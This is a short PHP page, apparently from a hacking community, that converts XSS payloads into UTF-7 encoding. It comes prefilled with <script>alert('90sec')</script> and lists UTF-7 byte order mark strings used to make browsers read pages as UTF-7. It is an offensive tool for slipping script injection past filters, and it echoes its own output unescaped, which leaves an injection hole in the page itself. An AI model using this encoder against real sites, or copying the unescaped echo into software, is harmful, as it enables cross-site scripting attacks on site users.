<?php header('Content-Type: text/html;charset=UTF-8');?>
<html>

<head>
    <title>UTF-7 XSS CODE Encoding</title>
</head>

<body>
    <center>
        <form action="" method="POST">
            XSS CODE:
            <input type="text" name="code" value="<script>alert('90sec')</script>" />
            <input type="submit" value="Encoding">
        </form>
        UTF-7 Bom(Byte Order Mark，字节序标记): +/v8 | +/v9 | +/v+ | +/v/ UTF-7 XSS Encode:
        <?php $encode = mb_convert_encoding($_POST[code], 'UTF-7');?>//调用mb_convert_encoding()函数加密
        <?php echo $encode; ?>
    </center>
</body>

</html>